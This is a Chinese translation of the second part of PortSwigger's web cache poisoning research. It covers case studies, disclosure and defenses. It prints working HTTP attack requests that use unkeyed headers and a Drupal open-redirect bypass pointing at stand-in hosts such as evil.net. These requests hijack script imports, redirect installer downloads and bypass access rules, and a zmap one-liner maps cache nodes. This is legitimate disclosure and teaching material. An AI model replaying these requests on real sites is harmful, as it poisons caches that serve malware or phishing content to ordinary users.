> 原文链接: https://www.anquanke.com//post/id/156551 


# 实战Web缓存投毒（下）


                                阅读量   
                                **204413**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：portswigger.net
                                <br>原文地址：[https://portswigger.net/blog/practical-web-cache-poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t014482c00a2979d21e.png)](https://p2.ssl.qhimg.com/t014482c00a2979d21e.png)

## 前言

承接上文，将翻译原作者剩下的部分，包括更加深入的投毒案例、防御的方法和结论



## 实例研究（Case Studies）

### 隐蔽的路由投毒（Hidden Route Poisoning）

路由投毒漏洞并不总是清晰明了的：

```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: canary

HTTP/1.1 302 Found
Location: https://ghost.org/fail/ 
```

Cloudflare的博客托管于Ghost，Ghost使用X-Forwarded-Host请求头来实现某些功能。你可以通过指定另一个可识别的主机名（例如blog.binary.com）来避免“失败”重定向，但在正常的blog.cloudflare.com响应之前，会有神秘的10秒延迟。乍一看，没有明显的方法来利用这一漏洞。

当用户首次使用Ghost注册博客时，它会在ghost.io域名下注册唯一的子域。一旦博客启动并运行，用户就可以定义像blog.cloudflare.com这样的任意自定义域名。如果用户定义了自定义域，则ghost.io子域将简单的重定向到自定义域名：

```
GET / HTTP/1.1
Host: noshandnibble.ghost.io

HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

至关重要的是，也可以使用X-Forwarded-Host请求触发此重定向：

```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io

HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

通过注册我自己的ghost.org帐户并设置自定义域名，我可以将发送到blog.cloudflare.com的请求重定向到我自己的网站：waf.party。这意味着我可以劫持像图像一类的资源负载：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://portswigger.net/cms/images/38/8b/c60d1ff4bc9d-article-cloudflareimage.png)

接下来的步骤，重定向javascript加载来获得对blog.cloudflare.com的完全控制的过程被一个巧合所阻挠-如果你仔细观察这个重定向，你会发现它使用HTTP而博客是通过HTTPS加载的，这意味着浏览器的混合内容（Mixed Content）保护机制会被触发并阻止脚本/样式表的重定向。

我找不到任何技术方法让Ghost发出HTTPS重定向，并且打算无所顾忌的向Ghost报告他们使用HTTP而不是HTTPS跳转的漏洞，既希望于他们可以为我加上HTTPS的跳转。最终，我决定将问题复制一份并将其在[hackxor](https://hackxor.net/mission?id=7)上以现金奖励众包的模式来寻找解决方案。第一份解决方案是Sajjad Hashemian发现的，他发现在Safari中如果waf.party在浏览器的HSTS cache中，重定向将自动升级到HTTPS而不是被阻断，[基于Manuel Caballero的工作](https://www.brokenbrowser.com/loading-insecure-content-in-secure-pages/),[Sam Thomas](https://twitter.com/_s_n_t)跟进了Edge的解决方案 – 指出302重定向到HTTPS URL可以完全绕过了Edge的混合内容保护机制。

总而言之，对于Safari和Edge用户，我可以投毒危害blog.cloudflare.com，blog.binary.com和其他所有ghost.org用户上的每个页面。对于Chrome / Firefox用户，我只能劫持图像。尽管我使用如上Cloudflare的截图作为漏洞证明，因为这是第三方系统中的一个问题，我选择通过Binary报告它，因为他们的bug赏金计划支付现金，不像Cloudflare的赏金计划。

### 串联非缓存键输入（Chaining Unkeyed Inputs）

有得时候，单一的非缓存键输入只能够混淆应用程序调用堆栈的一部分，并且您需要串联其他非缓存键的输入以达到可利用的结果。参考下面的网站：

```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz

HTTP/1.1 200 OK
Set-Cookie: locale=en; domain=xyz
```

X-Forwarded-Host请求头重写了cookie上domain的值，但在响应的其余部分中没有生成任何URL。只是这样一种情况就是难以利用的了。但是，还有另一个非缓存键输入：

```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Scheme: nothttps

HTTP/1.1 301 Moved Permanently
Location: https://redacted.net/en
```

这样的输入也是无用的，但如果我们将两者结合在一起，我们可以将响应转换为重定向到任意域：

```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps

HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en 
```

使用此技术，可以通过重定向POST请求从自定义HTTP请求头中窃取CSRF令牌。我还可以包含对JSON加载的恶意响应来获得存储型的DOM–XSS漏洞，类似于前面提到的data.gov的漏洞。

### Open Graph 劫持（Open Graph Hijacking）

在另一个站点上，非缓存键的输入仅仅影响Open Graph URL：

```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com

HTTP/1.1 200 OK
Cache-Control: max-age=0, private, must-revalidate
…
&lt;meta property="og:url" content='https://attacker.com/en'/&gt;
```

[Open Graph](http://ogp.me/)是一种由Facebook创建的协议，允许网站所有者决定他们的内容在社交媒体上被共享时会发生什么。我们在这里被劫持的og：url参数有效地覆盖了共享的URL，因此任何共享被投毒页面的人实际上最终都会共享我们选择共享的内容。

正如你所见，应用程序设置了’Cache-Control：private’，所以Cloudflare会拒绝缓存此类响应。幸运的是，网站上的其他页面明确的启用了缓存：

```
GET /popularPage HTTP/1.1
Host: redacted.net
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=14400
Set-Cookie: session_id=942…
CF-Cache-Status: MISS
```

这里的’CF-Cache-Status’请求头是Cloudflare正在考虑缓存此响应的指示器，但尽管如此，响应从未实际缓存过。我推测Cloudflare拒绝缓存这个可能与session_id cookie有关，并且使用该cookie重试：

```
GET /popularPage HTTP/1.1
Host: redacted.net
Cookie: session_id=942…;
X-Forwarded-Host: attacker.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=14400
CF-Cache-Status: HIT
…
&lt;meta property="og:url" 
content='https://attacker.com/…
```

这最终达到了缓存响应的目的，虽然后来证明我可以通过阅读[Cloudflare的缓存文档](https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/)而不是猜测的方法来实现这个目的。

尽管有响应被缓存，但“分享”结果仍然没有投毒成功; Facebook显然没有访问到我向投毒的特定的Cloudflare缓存。为了确定我需要向哪个缓存投毒，我利用了所有Cloudflare站点上都有的一个有用的调试功能 – /cdn-cgi/trace：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://portswigger.net/cms/images/c8/7c/6846e4bc6c75-article-cloudfacebooktrace2.jpg.png)

看这里，colo = AMS的一行显示Facebook已经通过在阿姆斯特丹的缓存访问了waf.party。目标网站是通过亚特兰大访问的，所以我在那里租了2美元/月的VPS并再次尝试投毒：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://portswigger.net/cms/images/cb/6e/483a36392ba0-article-atlanta.png)

在这些之后，任何试图在其网站上共享各种页面的人最终都会分享我选择的内容。这是一个经过严格修改的攻击视频：

[https://portswigger.net/cms/videos/49/7c/9ace115de5b2-opengraph.mp4](https://portswigger.net/cms/videos/49/7c/9ace115de5b2-opengraph.mp4)

### 本地路由劫持（Local Route Poisoning）

到目前为止，我们已经见识到了基于cookie的语言劫持，并且使用各种请求头重写host造成的一系列攻击灾难。在这一点的研究上，我还发现了一些使用奇怪的非标准的请求头的变体，例如’translate’，’bucket’和’path_info’，而且我怀疑我遗漏了许多其他请求头。在我通过下载并搜索GitHub上的前20,000个PHP项目以获取请求头名称来扩展请求头字典之后，事件取得了重大进展。

这暗示了X-Original-URL和X-Rewrite-URL请求头会覆盖了请求的路径。我第一次注意到它们会影响目标是在运行Drupal时，并且通过挖掘Drupal的源代码显示对此请求头的支持来自流行的PHP框架Symfony，它的作用是从Zend获取代码。最终结果就是大量的PHP应用程序无意中支持这些请求头。在我们尝试使用这些请求头进行缓存投毒之前，我认为它们也非常适合绕过WAF和安全规则：

```
GET /admin HTTP/1.1
Host: unity.com

HTTP/1.1 403 Forbidden
...
Access is denied
```

```
GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin

HTTP/1.1 200 OK
...
Please log in
```

如果应用程序使用缓存服务，则可以滥用这些请求头以将其混淆来提供不正确的页面。例如，此请求的缓存键为/ education？x = y，但是从/ gambling？x = y取回内容：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://portswigger.net/cms/images/7b/46/0dc96adf39de-article-cache-busting-1.svg)

最终结果是，在发送此请求后，任何试图访问Unity for Education页面的人都会收到一份小惊喜：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://portswigger.net/cms/images/36/ff/73c660a4bcf4-article-unitymaybe.png)

页面偷天换日的能力在不失严重性的同时更加有趣，但也许它在更大的利用链中占有一席之地。

### 内部缓存投毒（Internal Cache Poisoning）

Drupal通常和Varnish等第三方缓存一起使用，但它也包含默认启用的内部缓存。此缓存机制众所周知X-Original-URL请求头并将其包含在其缓存键中，但是犯了将此请求头中的查询字符串包含进缓存键中的错误：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://portswigger.net/cms/images/6c/c2/0148b0dd31eb-article-cache-busting-2.svg)

虽然之前的攻击让我们用另一个路径替换路径，但是这个攻击让我们重写了查询的字符串：

```
GET /search/node?keys=kittens HTTP/1.1

HTTP/1.1 200 OK
…
Search results for 'snuff'
```

这更有希望，但它仍然非常有限 – 我们需要第三种要素来实现攻击。

### Drupal开放重定向（Drupal Open Redirect）

在阅读Drupal URL-override代码时，我注意到一个风险极高的特性 – 在所有重定向响应中，你可以使用’destination’查询参数覆盖掉重定向的目标。 Drupal尝试进行一些URL解析以确保它不会重定向到外部域名，但这很容易被绕过：

```
GET //?destination=https://evil.net\@unity.com/ HTTP/1.1
Host: unity.com

HTTP/1.1 302 Found
Location: https://evil.net\@unity.com/
```

Drupal在路径中发现了双斜杠//并试图发出重定向到/来规范化它，然后目标参数生效。Drupal认为目标URL告诉人们使用用户名’evil.net’访问unity.com。但实际上，网站浏览器会在自动将转换为/，并将用户导航到evil.net/@unity.com上。

再一次，一个本身并不令人兴奋的开放重定向，但现在我们终于构建出了一个严重漏洞利用代码。

### 持续重定向攻击（Persistent redirect hijacking）

我们可以将参数覆盖攻击与开放的重定向结合起来，以持久地劫持任何重定向。 Pinterest商业网站上的某些页面恰好通过重定向导入JavaScript。以下请求以蓝色显示的缓存条目投毒，参数显示为橙色：

```
GET /?destination=https://evil.net\@business.pinterest.com/ HTTP/1.1
Host: business.pinterest.com
X-Original-URL: /foo.js?v=1
```

这劫持了JavaScript导入的目的地址，让我可以完全控制business.pinterest.com上的某些静态页面：

```
GET /foo.js?v=1 HTTP/1.1

HTTP/1.1 302 Found
Location: https://evil.net\@unity.com/
```

### 嵌套缓存投毒（Nested cache poisoning）

其他Drupal站点不那么容易利用，也不会通过重定向导入任何重要的资源。幸运的是，如果站点使用外部缓存（几乎所有访问量的Drupal站点），我们可以使用内部缓存来投毒外部缓存，并在此过程中将任何响应转换为重定向。这是一种两阶段的攻击。首先，我们向内部缓存投毒以用恶意重定向来替换/ redir：

```
GET /?destination=https://evil.net\@store.unity.com/ HTTP/1.1
Host: store.unity.com
X-Original-URL: /redir
```

接下来，我们向外部缓存投毒来将 /download?v=1替换为我们上一步投毒的/redir：

```
GET /download?v=1 HTTP/1.1
Host: store.unity.com
X-Original-URL: /redir
```

最终效果就是在unity.com上点击“下载安装程序”会从evil.net下载一些机会性恶意软件。此技术还可用于许多其他攻击，包括将欺骗性条目插入RSS源，使用网络钓鱼页替换登录页，以及通过动态脚本导入存储型XSS。<br>
下面是一个在Drupal安装过程中的这种攻击的视频：

[https://portswigger.net/cms/videos/5b/fe/e952b9f0eb55-drupaldemo.mp4](https://portswigger.net/cms/videos/5b/fe/e952b9f0eb55-drupaldemo.mp4)

此漏洞已于2018-05-29向Drupal，Symfony和Zend团队披露，并且在您阅读本文时，通过协调的补丁的发布这些请求头已经有希望被禁止。

### 跨云投毒（Cross-Cloud Poisoning）

正如您可能已经猜到的，这些漏洞报告中的一些报告引发了有趣的回应和响应。

使用CVSS的评分机制对我提交的漏洞进行分析，CloudFront缓存投毒漏洞在实现利用的复杂性为“高”，因为攻击者可能需要租用几个VPS才能完成向所有CloudFront的缓存投毒。我坚持尝试去找出是什么导致了在漏洞利用上的高代价，我把这作为一个探讨是否可以在不依赖VPS的情况下进行跨区域攻击的机会。

事实证明，CloudFront有一个实用的缓存地图，并且可以使用从大量地理位置发出DNS查询请求的[免费在线服务](https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&amp;t=A)轻松识别出它们的IP地址。从你舒适的卧室向特定区域投毒就像使用curl / Burp的主机名重写特性将攻击路由到其中一个IP一样简单。

由于Cloudflare有着更多的区域缓存，我决定也看看它们。 Cloudflare在网上发布了他们所有的IP地址列表，因此我编写了一个快速处理脚本，通过每个IP请求waf.party/cgn-cgi/trace并记录我命中的缓存：

```
curl https://www.cloudflare.com/ips-v4 | sudo zmap -p80| zgrab --port 80 --data traceReq | fgrep visit_scheme | jq -c '[.ip , .data.read]' cf80scheme | sed -E 's/\["([0-9.]*)".*colo=([A-Z]+).*/\1 \2/' | awk -F " " '!x[$2]++'
```

这表明，当目标为waf.party（服务器在爱尔兰）时，我可以从曼彻斯特的家中命中以下缓存：

```
104.28.19.112 LHR    172.64.13.163 EWR    198.41.212.78 AMS
172.64.47.124 DME    172.64.32.99 SIN     108.162.253.199 MSP
172.64.9.230 IAD     198.41.238.27 AKL    162.158.145.197 YVR
```



## 防御（Defense）

针对缓存投毒的最强大防御办法就是禁用缓存。对于一些人来说，这显然是不切实际的建议，但我推测很多网站开始使用Cloudflare等服务的目的是进行DDoS保护或简化SSL的过程，结果就是容易受到缓存投毒的影响，因为默认情况下缓存是启动的。

如果您对确定哪些内容是“静态”的足够确认，那么只对纯静态的响应进行缓存也是有效的。

同样，避免从请求头和cookie中获取输入是防止缓存投毒的有效方法，但很难知道其他层和框架是否在偷偷支持额外的请求头。因此，我建议使用Param Miner审计应用程序的每个页面以清除非缓存键的输入。

一旦在应用程序中识别出非缓存键的输入，理想的解决方案就是彻底禁用它们。如果不能这样做，您可以在缓存层中剥离该输入，或将它们添加到缓存键。某些缓存允许您使用[Vary请求头](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary)来输入非缓存键的输入，而另外一些缓存允许您定义自定义缓存键，但可能会将此功能限制为“企业”客户。

最后，无论您的应用程序是否使用缓存技术，你的某些客户端可能在其末端都存在缓存，因此不应忽视HTTP请求头中的XSS等客户端漏洞。



## 结论（Conclusion）

Web缓存投毒绝非理论上的漏洞，复杂的应用程序和越来越深的服务器调用栈正在悄悄的将它带到大众的面前。我们已经看到，即使是知名的框架也可能隐藏了危险的普遍存在的特性的，从而证实，因为它是开源的并且拥有数百万用户，就假设其他用户就已经阅读了它的源代码，这样是不安全的。我们还看到在网站前端放置缓存的行为是如何将其从完全安全转变成极易受到攻击的状态。我认为这是一个更大趋势的一部分，随着网站越来越依赖于辅助系统，对他们的安全状况单独进行评估将越来越难。

最后，我为人们测试他们学到的知识构建了一个[小挑战](https://hackxor.net/mission?id=8)，并期待看到其他研究人员在将来都能掌握web缓存投毒。
